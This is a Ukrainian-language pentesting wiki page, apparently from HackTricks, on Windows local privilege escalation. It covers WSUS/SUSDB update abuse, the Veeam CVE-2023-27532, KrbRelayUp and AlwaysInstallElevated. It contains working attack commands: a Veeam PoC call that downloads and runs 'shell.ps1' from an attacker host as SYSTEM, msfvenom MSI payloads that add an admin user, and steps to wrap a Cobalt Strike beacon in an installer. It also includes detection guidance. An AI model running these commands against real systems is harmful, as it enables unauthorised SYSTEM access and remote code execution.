# Підвищення локальних привілеїв у Windows

{{#include ../../banners/hacktricks-training.md}}

### **Найкращий інструмент для пошуку векторів локального підвищення привілеїв у Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

На цій сторінці зібрано загальну методологію підвищення привілеїв у Windows із кількох базових посібників.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Практичний процес переліку також спирається на воркшопи й контрольні списки спільноти.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Історичний матеріал про атаки містить доповідь DerbyCon про підвищення привілеїв у Windows.<sup>[[5]](#references)</sup>

## Початкові відомості про Windows

### Access Tokens

**Якщо ви не знаєте, що таке access tokens у Windows, прочитайте наведену нижче сторінку, перш ніж продовжити:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Щоб дізнатися більше про ACLs - DACLs/SACLs/ACEs, перегляньте наведену нижче сторінку:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Рівні цілісності

**Якщо ви не знаєте, що таке рівні цілісності у Windows, прочитайте наведену нижче сторінку, перш ніж продовжити:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Засоби безпеки Windows

У Windows є різні механізми, які можуть **завадити вам збирати дані про систему**, запускати виконувані файли або навіть **виявити вашу активність**. Перш ніж починати перелік для підвищення привілеїв, слід **прочитати** наведену нижче **сторінку** та **перевірити** всі ці **механізми захисту**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Фізичний доступ також може перетворити офлайн-редагування UEFI NVRAM на DMA до завантаження та ланцюжок патчингу пам'яті Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / непомітне підвищення привілеїв UIAccess

Процеси UIAccess, запущені через `RAiLaunchAdminProcess`, можна використати для отримання High IL без запитів підтвердження, якщо обійти перевірки захищених шляхів AppInfo. Ознайомтеся з окремим процесом обходу UIAccess/Admin Protection тут:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Поширення параметрів реєстру доступності Secure Desktop можна використати для довільного запису до реєстру від імені SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

У новіших збірках Windows також з'явився шлях LPE через **довільний порт SMB**, де привілейована локальна NTLM-автентифікація передається через повторно використане SMB TCP-з'єднання:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Інформація про систему

Щоб зібрати локальні дані з наявного сеансу PowerShell, див. [Перелік даних Windows за допомогою .NET](../basic-powershell-for-pentesters/dotnet-enumeration.md). Ці приклади доповнюють наведені нижче перевірки й не запускають окремі виконувані файли для збору даних.

### Перелік відомостей про версію

Перевірте, чи є у версії Windows відомі вразливості (також перевірте встановлені оновлення безпеки).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Експлойти для версій

Цей [сайт](https://msrc.microsoft.com/update-guide/vulnerability) зручний для пошуку докладної інформації про вразливості безпеки Microsoft. Ця база даних містить понад 4 700 вразливостей безпеки, що демонструє **величезну поверхню атаки**, яку створює середовище Windows.

**У системі**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas містить watson)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — збирає дані про збірку ОС, встановлені оновлення та потенційно відповідні рекомендації з безпеки; перш ніж вважати результат релевантним, перевірте точний продукт і замінні оновлення.

Для локального exploit, специфічного для певної версії, перевірте **архітектуру запущеного процесу**, а також архітектуру ОС. У 64-бітній Windows для 32-бітного процесу діє [перенаправлення файлової системи WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` зазвичай вказує на 32-бітний системний каталог, тоді як `%windir%\Sysnative` надає цьому процесу доступ до нативного системного каталогу. Цей псевдонім недоступний 64-бітному процесу. Збірка ОС або відсутнє оновлення KB самі по собі не доводять, що система вразлива до exploit; звірте поточну збірку, встановлене або замінне оновлення, архітектуру процесу та передумови exploit з [бюлетенем безпеки Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032), присвяченим конкретній проблемі.

Приклад пошкодження пам’яті служби див. у розділі про [зміщення в кільцевому буфері спільної пам’яті MIDI, контрольовані клієнтом](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions). Опубліковані зміщення у стеку застосовні лише до протестованої збірки; отримання прав `LOCAL SERVICE` — це окремий крок від подальшого підвищення прав до `SYSTEM` за допомогою [SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md).<sup>[[44]](#references)</sup>

**Локально, використовуючи інформацію про систему**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Репозиторії експлойтів на Github:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Середовище

Чи збережено в змінних середовища якісь облікові дані або цінну інформацію?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Історія PowerShell

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

Доступний для запису [профіль PowerShell](../basic-powershell-for-pentesters/#powershell-profile-startup-injection) — це окрема можливість виконання під час запуску; перш ніж вважати це підвищенням привілеїв, перевірте, чи справді користувач із вищими привілеями завантажує цей профіль.

### Файли транскриптів PowerShell

Дізнатися, як це ввімкнути, можна тут: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` — лише приклад. [Політика транскрибування PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) зазвичай зберігає файли в папці Documents кожного користувача, але параметр `OutputDirectory` або `Start-Transcript -OutputDirectory` може перенаправити їх до спільної чи прихованої папки. Перш ніж переглядати транскрипт, перевірте фактичний шлях збереження та ACL файлу: він може містити аргументи команд і вивід, зокрема облікові дані. Доступний для читання транскрипт — лише зачіпка, і лише якщо його вміст розкриває придатний для використання обліковий запис із вищими привілеями, який може ввійти в систему у відповідному контексті.

### Журналювання модулів PowerShell

Записуються відомості про виконання конвеєрів PowerShell, зокрема виконані команди, виклики команд і частини скриптів. Однак повні відомості про виконання та результати виводу можуть не записуватися.

Щоб увімкнути цю функцію, дотримуйтеся інструкцій у розділі документації «Файли транскриптів», вибравши **"Module Logging"** замість **"Powershell Transcription"**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Щоб переглянути останні 15 подій із журналів PowersShell, виконайте:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Фіксується повний запис активності та вмісту під час виконання скрипту, що забезпечує документування кожного блоку коду в процесі його виконання. Цей процес зберігає вичерпний аудиторський журнал усіх дій, цінний для форензики та аналізу шкідливої поведінки. Документування всіх дій під час виконання дає змогу отримати детальне уявлення про процес.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Події журналювання для Script Block можна знайти в Переглядачі подій Windows за шляхом: **Журнали програм і служб > Microsoft > Windows > PowerShell > Operational**.\
Щоб переглянути останні 20 подій, можна використати:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Налаштування Інтернету

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Диски

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

У попередніх рекомендаціях ризик було підсумовано так:

Ви можете скомпрометувати систему, якщо оновлення запитуються не через http**S**, а через http.

Кінцева точка WSUS через HTTP — це привід перевірити, чи можна перехопити метадані оновлень. Експлуатація також залежить від того, чи використовує клієнт цей сервер WSUS, чи може зловмисник перехоплювати або контролювати його трафік, а також від політики довіри до оновлень і їх встановлення на клієнті. Самої URL-адреси недостатньо, щоб підтвердити можливість виконання коду. [Microsoft рекомендує використовувати TLS для метаданих WSUS](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Спершу перевірте, чи використовує мережа оновлення WSUS без SSL, виконавши в cmd таку команду:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Або таке в PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Якщо ви отримали відповідь, подібну до однієї з таких:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

І якщо `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` або `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` дорівнює `1`.

Початкове твердження про застосовність було таким:

Тоді **це можна експлуатувати.** Якщо останнє значення реєстру дорівнює `0`, запис WSUS буде проігноровано.

Коли `UseWUServer` дорівнює `1`, Windows Update використовує налаштовану внутрішню службу. Це підтверджує одну з передумов для перехоплення HTTP-трафіку, але не доводить, що перехоплення, прийняття шкідливого оновлення чи встановлення з підвищеними привілеями можливі. Коли значення дорівнює `0`, ця конкретна кінцева точка WSUS, налаштована цією політикою, не вибирається.

Щоб експлуатувати ці вразливості, можна скористатися такими інструментами, як [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — це weaponized MiTM-скрипти експлойтів для впровадження «підроблених» оновлень у незашифрований SSL-трафік WSUS.

Ознайомтеся з дослідженням:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Прочитайте повний звіт тут**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
По суті, ця помилка експлуатує таку ваду:

> Якщо ми можемо змінювати проксі-сервер локального користувача, а Windows Updates використовує проксі-сервер, налаштований у параметрах Internet Explorer, то ми можемо локально запустити [PyWSUS](https://github.com/GoSecure/pywsus), щоб перехопити власний трафік і виконати код із підвищеними привілеями на нашому пристрої.
>
> Крім того, оскільки служба WSUS використовує параметри поточного користувача, вона також використовує його сховище сертифікатів. Якщо створити самопідписаний сертифікат для імені хоста WSUS і додати його до сховища сертифікатів поточного користувача, можна перехоплювати трафік WSUS як HTTP, так і HTTPS. WSUS не використовує механізмів на кшталт HSTS для реалізації перевірки сертифіката за принципом trust-on-first-use. Якщо сертифікат, який надається, довірений користувачем і має правильне ім’я хоста, служба його прийме.

Цю вразливість можна експлуатувати за допомогою інструмента [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (щойно його буде оприлюднено).

### Оновлення WSUS, контрольовані адміністратором

Окремий шлях можливий, якщо поточна ідентичність може **публікувати й затверджувати** оновлення на сервері WSUS. Перевірте ефективне членство в групі сервера `WSUS Administrators` і будь-які делеговані дозволи WSUS, а потім визначте групу комп’ютерів-клієнтів, яка отримає затверджене оновлення. [Microsoft вимагає привілеїв адміністратора WSUS для затвердження оновлень](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) і [документує відносини довіри під час публікації](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): клієнти мають довіряти сертифікату підпису, використаному для локально опублікованого вмісту. Перш ніж вважати це шляхом підвищення привілеїв, переконайтеся, що потенційне оновлення підписане й приймається, застосовне до цільової системи та встановлюється в контексті з вищими привілеями. Саме лише значення HTTP `WUServer` або назва групи не підтверджує виконання цих умов.

### Зловживання спеціальними оновленнями SUSDB: непідписані payload через `.txt`/`.esd`

Це інше порушення межі довіри, ніж перехоплення HTTP-з’єднання WSUS: необхідною передумовою є достатній доступ до збережених процедур бази даних WSUS (`SUSDB`), щоб публікувати й затверджувати спеціальне оновлення. Один із практичних шляхів отримання такого доступу — ретрансляція облікових даних облікового запису комп’ютера висхідного сервера WSUS на окремий сервер MSSQL, де розміщено `SUSDB`; точні передумови залежать від розгортання, тому спершу перевірте дозволи `EXECUTE`, а не припускайте наявність прав адміністратора SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Окремий шлях атаки, що ретранслює автентифікацію клієнта WSUS з HTTP/8530 до LDAP, SMB або AD CS, описано тут: [Зловживання HTTP WSUS для NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Перевірка ретрансляції до зовнішньої бази даних і прав на процедури

У розгортаннях, де WSUS використовує зовнішній SQL Server, спершу перевірте, чи може обліковий запис сервера WSUS автентифікуватися в базі даних і чи доходить NTLM relay до цього прослуховувача. Роль сервера SQL може надавати доступ до процедур публікації оновлень, навіть якщо прямий запис у таблиці заборонено; невдала команда `UPDATE` до `SUSDB` не доводить, що публікацію заблоковано. Перш ніж намагатися створити спеціальне оновлення, перевірте ефективну ідентичність, членство в ролях і дозволи на процедури в авторизованому сеансі SQL.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Визначення процедур у системі та встановлений файл `SoftwareDistributionPackage.xsd` корисні для відтворення коректних метаданих оновлення. Для батьківського пакета та дочірнього payload потрібні `UpdateIdentity` (тип фрагмента `1`), `LocalizedProperties` (`4`) і `ExtendedProperties` (`2`); збережіть локальний ID редакції, повернений кожним викликом `spImportUpdate`, і узгодьте зв’язок пакета, дайджести, розмір, URL вмісту та редакцію. Це робочий процес публікації зі збереженням стану, тому успішний виклик збереженої процедури сам по собі не доводить виконання на стороні клієнта.<sup>[[38]](#references)</sup>

#### Створення, призначення цілі та схвалення оновлення

У робочому процесі власних оновлень легітимні процедури WSUS використовуються як обмежений API для публікації. Важливі переходи стану:<sup>[[38]](#references)</sup>

| Етап | Відповідні збережені процедури |
| --- | --- |
| Імпорт метаданих оновлення | `spImportUpdate` |
| Збереження XML-фрагментів передумов, локалізованих і розширених властивостей | `spSaveXMLFragment` |
| Прив’язка дайджесту вмісту до URL, контрольованого зловмисником | `spSetBatchURL` |
| Перелік/створення групи комп’ютерів і додавання клієнта | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Схвалення встановлення для цієї групи | `spDeployUpdate` з `@actionID = 0` і `@isAssigned = 1` |

Ім’я файлу, дайджести, розмір і обробник `CommandLineInstallation` мають узгоджуватися в імпортованих метаданих і фрагментах. Після призначення URL вмісту та цільової групи остаточне схвалення матиме приблизно такий вигляд; використовуйте нові ідентифікатори оновлення, групи та розгортання, а не повторно використовуйте приклади GUID.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Обхід перевірки підпису через розширення

WSUS зазвичай відхиляє довільний непідписаний виконуваний вміст. Однак у `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` шлях .NET `VerifyFile` встановлює прапорець перевірки сертифіката в значення false, якщо передане ім’я файлу закінчується на `.txt` або `.esd`; `CheckCertificateSignature` тоді пропускається без попередньої перевірки, чи є байти текстом або справжнім образом ESD. Тому незмінений PE-файл із назвою, наприклад, `payload.exe.txt` може пройти перевірку вмісту, а згодом бути запущеним обробником командного рядка під час інсталяції оновлення. Це помилка плутанини політик і типів, а не підроблення підпису.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Staging і автоматизація, сумісні з BITS

Виклик `spDeployUpdate` змушує WSUS отримати зареєстрований вміст. Джерело має відповідати вимогам BITS до HTTP: самого доступного URL недостатньо, оскільки передавання використовує початковий потік `HEAD`/`GET` і запити діапазонів байтів. Сервер без підтримки Range спричиняє помилку синхронізації WSUS `EventId=364` із повідомленням, що BITS вимагає заголовок протоколу Range.<sup>[[39]](#references)</sup>

Дослідницький PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) генерує SQL, необхідний для ланцюжка імпорту/фрагмента/URL/групи/розгортання, містить модифікований клієнт MSSQL для його виконання та постачається з `BitsWebServer.py` для staging вмісту. Мінімальний запуск у дозволеній лабораторії:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Виконання без участі користувача та persistence через повторні спроби

Взаємодія на боці клієнта залежить від політики. Параметр `4 - Auto download and schedule install` у `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` дає змогу схваленому оновленню завантажуватися та встановлюватися за налаштованим розкладом без ручного вибору користувачем. Під час тестування payload, оновлення якого залишалося в стані помилки або незавершеному стані, одразу пропонувався повторно після завершення процесу callback, тож поведінка повторних спроб може перетворитися на recurring execution persistence; це помітно, оскільки клієнт відображає стан невдалого оновлення.<sup>[[39]](#references)</sup>

#### Напрями виявлення та посилення захисту

Корисні напрями перевірки на сервері та клієнті в межах цього ланцюжка:<sup>[[39]](#references)</sup>

- Аудитуйте виконання `spCreateTargetGroup`, `spSetBatchURL` і `spDeployUpdate` у `SUSDB`; перевіряйте нові групи таргетингу, зовнішні джерела вмісту, payload оновлень `.txt`/`.esd` і розгортання, виконані неочікуваними обліковими записами (особливо некомп’ютерними).
- Переглядайте `C:\Program Files\Update Services\LogFiles` на наявність `ContentSyncAgent`, `FileVerified`, помилково написаного `FileVerficationFailed` і `EventId=364`; зіставляйте результати перевірки з розширенням payload і сигнатурою вмісту, а не покладайтеся на суфікс.
- Виявляйте повторні невдалі спроби встановлення Windows Update та виконання PE або неочікувану дочірню/мережеву активність для вмісту з назвами `.txt` або `.esd`.
- Вимагайте Extended Protection for Authentication для служби бази даних, якщо це підтримується, і обмежте мережевий доступ до бази даних сервером WSUS та авторизованими адміністративними системами. Мінімізуйте права `EXECUTE` для процедур кастомних оновлень і проводьте їх аудит.

## Сторонні auto-updater-и та Agent IPC (local privesc)

Багато корпоративних агентів надають локальний IPC-інтерфейс і привілейований канал оновлення. Якщо реєстрацію можна спрямувати на сервер зловмисника, а updater довіряє підробленому кореневому CA або має слабкі перевірки підписувача, локальний користувач може доставити шкідливий MSI, який встановить служба SYSTEM. Узагальнений опис техніки (на основі ланцюжка Netskope stAgentSvc – CVE-2025-0309) наведено тут:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM через TCP 9401)

Початковий опис для конкретних версій і примітка щодо розвідки:

Veeam B&R < `11.0.1.1261` надає локальну службу на **TCP/9401**, яка обробляє контрольовані зловмисником повідомлення, даючи змогу виконувати довільні команди від імені **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup>

- **Розвідка**: перевірте наявність listener-а та версію, наприклад, за допомогою `netstat -ano | findstr 9401` і `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.

Veeam Backup & Replication і Cloud Connect за замовчуванням використовують основну службу резервного копіювання на **TCP/9401**. [Рекомендація Veeam](https://www.veeam.com/kb4424) описує неавтентифіковане розкриття зашифрованих облікових даних бази даних конфігурації в межах периметра мережі резервного копіювання; окремий публічний PoC демонструє шлях до виконання команд від імені **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Служба може прив’язуватися не лише до localhost, тому перевірте фактичну адресу та PID.

- **Розвідка**: переконайтеся, що TCP/9401 належить `Veeam.Backup.Service.exe`, а потім перевірте встановлений продукт і метадані патчів. `netstat -ano | findstr 9401` і `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` є підказками, але не дають повної перевірки наявності патчів.
- **Мінімальні версії з виправленням**: Veeam указує **11a build 11.0.1.1261 P20230227** і **12 build 12.0.0.1420 P20230223** як перші виправлені релізи; попередні релізи вразливі. За однією лише чотирикомпонентною версією файлу неможливо відрізнити невиправлену базову збірку від пізнішого патча для тих самих номерів збірок. Перш ніж вважати граничну збірку виправленою, перевірте ідентифікатор патча за [історією збірок постачальника](https://www.veeam.com/kb2680).
- **Експлуатація**: розмістіть PoC, наприклад `VeeamHax.exe`, разом із потрібними DLL Veeam в одному каталозі, а потім запустіть payload від імені SYSTEM через локальний сокет:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Служба виконує команду від імені SYSTEM.

У наведеному PoC показано виконання команд від імені SYSTEM за наявності додаткових передумов; в advisory постачальника описано проблему розкриття облікових даних.

## KrbRelayUp

Початковий опис поведінки в середовищі зі стандартними налаштуваннями:

У середовищах Windows **domain** за певних умов існує вразливість **local privilege escalation**. До цих умов належать середовища, де **LDAP signing не примусово ввімкнено,** користувачі мають права self-rights, що дозволяють їм налаштовувати **Resource-Based Constrained Delegation (RBCD)**, а також можуть створювати комп’ютери в домені. Важливо зазначити, що ці **вимоги** виконуються за **стандартних налаштувань**.

Локальний Kerberos relay може перейти від сеансу входу з нижчими привілеями до привілейованого запису в каталозі, якщо відповідний COM server проходить автентифікацію, а пересланий principal має права на цільовий об’єкт. [У документації KrbRelay](https://github.com/cube0x0/KrbRelay) описано записи LDAP для RBCD і `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp автоматизує деякі з цих шляхів. Для ланцюжка RBCD потрібні відповідні права делегування та права на цільовий об’єкт, а для ланцюжка shadow-credential — права на запис ключових облікових даних і KDC, що підтримує шлях автентифікації за допомогою сертифіката. Жоден із цих шляхів не випливає лише з членства в домені.

Перевірте політики фактичного DC щодо [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) і [прив’язки каналу LDAPS](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), ACL об’єкта для пересланої ідентичності, а також рівні автентифікації та імперсонації вибраного класу COM. Тип входу користувача та контекст облікових даних мають значення: сеанс WinRM може поводитися інакше, ніж інтерактивний вхід або вхід із новими обліковими даними. Маршрутизація через брандмауер/OXID та встановлені оновлення також можуть вплинути на результат. Розглядайте дозвільну політику або відповідний ACL як підставу для перевірки; пасивне збирання даних не має запускати примусову автентифікацію через COM, relay-автентифікацію чи записи в каталозі. Shadow credential облікового запису комп’ютера може дати змогу отримати machine ticket і, лише якщо цей обліковий запис має потрібні права реплікації каталогу, перейти до окремого шляху DCSync.

Знайдіть **exploit у** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Щоб дізнатися більше про перебіг атаки, перегляньте [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Якщо** ці 2 ключі реєстру **ввімкнено** (значення — **0x1**), користувачі з будь-яким рівнем привілеїв можуть **встановлювати** (виконувати) файли `*.msi` від імені NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Якщо у вас є meterpreter session, ви можете автоматизувати цю техніку за допомогою модуля **`exploit/windows/local/always_install_elevated`**

### PowerUP

Використайте команду `Write-UserAddMSI` з power-up, щоб створити в поточному каталозі бінарний файл Windows MSI для підвищення привілеїв. Цей скрипт записує попередньо скомпільований інсталятор MSI, який пропонує додати користувача/групу (тому вам знадобиться доступ до GIU):

```
Write-UserAddMSI
```

Просто запустіть створений бінарний файл, щоб підвищити привілеї.

### MSI Wrapper

Прочитайте цей посібник, щоб дізнатися, як створити MSI wrapper за допомогою цих інструментів. Зверніть увагу: ви можете обгорнути файл "**.bat**", якщо хочете **лише** **виконувати** **командні рядки**.


{{#ref}}
msi-wrapper.md
{{#endref}}

### Створення MSI за допомогою WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Створення MSI за допомогою Visual Studio

- **Створіть** за допомогою Cobalt Strike або Metasploit **новий Windows EXE TCP payload** у `C:\privesc\beacon.exe`
- Відкрийте **Visual Studio**, виберіть **Create a new project** і введіть "installer" у поле пошуку. Виберіть проєкт **Setup Wizard** і натисніть **Next**.
- Введіть назву проєкту, наприклад **AlwaysPrivesc**, укажіть **`C:\privesc`** як розташування, виберіть **place solution and project in the same directory** і натисніть **Create**.
- Продовжуйте натискати **Next**, доки не дійдете до кроку 3 із 4 (вибір файлів для включення). Натисніть **Add** і виберіть щойно створений Beacon payload. Потім натисніть **Finish**.
- Виділіть проєкт **AlwaysPrivesc** у **Solution Explorer** і в розділі **Properties** змініть **TargetPlatform** з **x86** на **x64**.
  - Можна змінити й інші властивості, як-от **Author** і **Manufacturer**, щоб установлена програма виглядала правдоподібніше.
- Клацніть проєкт правою кнопкою миші та виберіть **View > Custom Actions**.
- Клацніть **Install** правою кнопкою миші та виберіть **Add Custom Action**.
- Двічі клацніть **Application Folder**, виберіть файл **beacon.exe** і натисніть **OK**. Це забезпечить запуск Beacon payload одразу після запуску інсталятора.
- У розділі **Custom Action Properties** змініть **Run64Bit** на **True**.
